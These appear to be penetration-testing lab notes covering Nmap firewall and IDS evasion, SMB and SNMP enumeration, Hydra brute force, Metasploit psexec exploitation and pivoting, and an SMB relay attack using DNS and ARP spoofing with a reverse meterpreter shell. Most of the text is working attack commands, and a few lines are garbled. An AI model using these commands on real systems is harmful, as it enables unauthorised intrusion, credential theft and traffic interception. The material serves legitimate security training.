### 1.1. Firewall Detection & IDS Evasion

The object of this section is going to revolve around how you can use Nmap to detect the presence of a host based firewall, or the presence of a filtering mechanism. Improve Nmap scan in order to detect a firewall and evade it.

**Detect Firewalls**

```shell
nmap -sA <target_IP> # ACK scan to detect firewall presence
nmap -Pn -sS -F <target_IP> # Stealth SYN scan on common ports
nmap -Pn -sS -F -p 445,3389 <target_IP> # Target specific ports
# Check Port Status: Look for filtered or unfiltered results.
```

**Evade Firewalls**

```shell
nmap -Pn -sS -sV -F -f -p 80,445,3389 <target_IP> # Fragment packets
nmap -Pn -sS -sV -F -f --mtu 32 <target_IP> # Manipulate packet size
```

**IP Spoofing and Decoy**
- IP Spoofing is a technique where an attacker falsifies the source IP address in packet headers to make it appear as if the traffic is coming from another machine. 
- Decoy scanning is an Nmap feature that sends packets from multiple fake IP addresses along with your real IP. This confuses intrusion detection systems (IDS) and firewalls, making it difficult for the target to identify the real attacker.

```shell
nmap -Pn -sS -sV -p 445,3389 -f --data-length 200 -D <gateway-IP-1>,<gateway-IP-2> <target-IP> # Use decoys
nmap -Pn -sS -sV -p 445,3389 -f --data-length 200 -g 53 -D <gateway-IP-1>,<gateway-IP-2> <target-IP> # Spoof port 53
```

## 2. Networks Attacks

### 2.1. SMB & NetBIOS Enumeration

You will learn to enumerate the SMB service and exploit it using different brute-forcing and exploitation tools. Also, it covers pivoting and how to leverage net utility to mount the shared drives in the pivot network.

**Objective:** Exploit both the target and find the flag!

```shell
cat /etc/hosts
ping -c 1 <target_IP_1>
ping -c 1 <target_IP_2> # Not reachable
nmap -sV -O <target_IP_1>
# By default, the SMB service uses either IP port 139 or 445.
```

All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc. In this section, we will perform attacks on the SMB service.

```shell
nmap -sV -p 139,445 <target_IP_1>
ls /usr/share/nmap/scripts/ | grep smb

# Now, let's identify all the supported SMB versions on the target machine.
nmap -p 445 --script smb-protocols <target_IP_1>
# We can notice that all three versions are accessible.

# Let's run the nmap script to find the smb protocol security level.
nmap -p 445 --script smb-security-mode <target_IP_1>

# Let's run the smbclient tool to find that we have anonymous access on the target machine.
smbclient -L <target_IP_1>
# We can access the target using anonymous login.
```

We can access the target using anonymous login. Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script. 

```shell
nmap -p445 --script smb-enum-users.nse <target_IP_1>
# There are a total of four users present. admin, administrator, root, and guest.

# Now, let's find the valid password for admin, administrator, and root user.
vim users.txt
admin
administrator
root
```

Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.

```shell
hydra 
-L 
users.txt 
-P 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
<target_IP> 
smb
```

Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.

```shell
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS <target_IP_1>
set SMBUser <user>
set SMBPass <password>
exploit

getuid
sysinfo

shell
dir C:\ /s /b | findstr /i flag
# Searches for files and folders containing the word "flag" (case-insensitive) anywhere in their name across the entire C:\ drive.

# Now, let's ping to the second target and verify that it is reachable from the second machine.
```

Here we need to perform pivoting by adding route from the Metasploit framework.
Let's add the route using the meterpreter session and identify the second machine service.

```shell
run autoroute -s <second_target_IP><netmask>
# This command is used in the Meterpreter session within the Metasploit Framework. It sets up a route through a compromised machine to access other networks that are not directly reachable from the attacker's machine.

# We have successfully added the route to access the demo1.ine.local machine.
```

Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.
First start the socks server using the Metasploit module.

```shell
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a 
exploit
jobs
```

Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine. We could also specify multiple ports. But, in this case, we are only interested in SMB service.

```shell
proxychains nmap <target_IP_2> -sT -Pn -sV -p 445
```

Now, let's use the net view command to find all resources shared by the <target_IP_2> machine.

```shell
# Interact with the meterpreter session again.
sessions -i 1

pgrep explorer
migrate <process_ID>

shell
net view <target_IP_2>
```

We can see two shared resources. **Documents** and **K** drive. This confirms that pivot target allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.

```shell
net use D: \\<target_IP_2>\Documents
net use K: \\<target_IP_2>\K$

# We successfully mapped the resources to D and K drives. Let's check what is inside these mapped drives.
dir D:
dir K:

cd D:\\ 
download Confidentia.txt
download FLAG2.txt
```

### 2.2. SNMP Analysis

SNMP (Simple Network Management Protocol) is a network protocol used for monitoring, managing, and configuring devices like routers, switches, servers, and printers over IP networks. It enables network administrators to collect information, detect faults, and configure network devices remotely through a management system.

**Objective**: Exploit the target to gain the shell and find the flag!
The best tools for this goal are:
- Nmap
- Metasploit Framework
- snmpwalk
- Hydra

**Scan the target**

```shell
nmap -Pn -sV <target_IP>
nmap -sU -p 161 <target_IP>
```

We can notice, multiple ports are open on the target machine. Now, let's check if the SNMP port is open or not. As we can see, the UDP port 161 is open. This information is crucial for our following tasks.

```shell
ls /usr/share/nmap/scripts/ | grep snmp
ls -al /usr/share/nmap/scripts/ | grep snmp # -al > All files | Long listing format

nmap -sU -p 161 --script snmp-brute <target_IP>
# As we can see, we found three community names: public, private, and secret

nmap -sU -p 161 --script snmp-win32-users <target_IP>
# Attempts to enumerate Windows user accounts through SNMP
# snmp-win32-users: Administrator, DefaultAccount, Guest, WDAGUtilityAccount, admin

nmap -sU -p 161 --script snmp-* <target_IP> > snmp_output
# The above command would run all the nmap SNMP scripts on the target machine and store its output to the snmp_output file.
```

Now, let's run a brute-force attack using these windows users on SMB service. Port 445 is open, and we can run a brute-force attack using the hydra tool.

```shell
hydra 
-l <username>
-P /usr/share /metasploit-framewords/data/wordlists/unix_passwords.txt 
<target_IP> smb 
# We can now authenticate via psexec or we can use the metasploit module.

msfconsole -q
search smb psexec
use exploit/windows/smb/psexec
set RHOSTS, SMBUSER, SMBPASS <set>
exploit

# meterpreter
cd C:/
cat FLAG1.txt
```

### 2.3. SMB Relay Attack

The assumptions of this security engagement are:
- You are going to do an internal penetration test, where you will be connected directly into their LAN network 172.16.5.0/24. The scope in this test is only the 172.16.5.0/24 segment.
- You are in a production network, so you should not lock any user account by guessing their usernames and passwords.

**Goals**: 
- Exploitation using SMB Relay Attack
- Manipulating network traffic with dnsspoof

![[Pasted image 20250223160924.png]]

Launch an attack using the SMB Relay Exploit in a way that once the Client (172.16.5.5) issues a SMB connection to any hosts on the .sportsfoo.com domain it can be redirected to your Metasploit server, and then you can use its credentials to get a shell on the target machine (172.16.5.10).

**Step 1:** Start **msfconsole** and configure the SMB Relay exploit: **Commands:**

```shell
service postgresql start && msfconsole
search  smb_relay
use exploit/windows/smb/smb_relay
show options
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

**Step 2:** Configure dnsspoof

```shell
# In order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain, create a file with fake dns entry with all subdomains of sportsfoo.com pointing to our attacker machine.

echo "172.16.5.101 *.sportsfoo.com" > dns
# We are ready to run.
dnsspoof -i eth1 -f dns

# How move on to setting up the man in the middle attack and we'll utilize arp spoofing and our goal is to poison the traffic between our victim which is the Windows 7 system and the default gateway.
echo 1 > /proc/sys/net/ipv4/ip_forward
# In one terminal
arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP> # without -r

# In another terminal
arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP> 

# Every time the victim system or the wiondows 7 starts on SMB connection DNS spoof aligned with the arp spoofing attack forgets the DNS replies telling that the DNS address that they're looking for resolves to the Kali Linux system.
exploit # metasploit
jobs

sessions
getuid
```
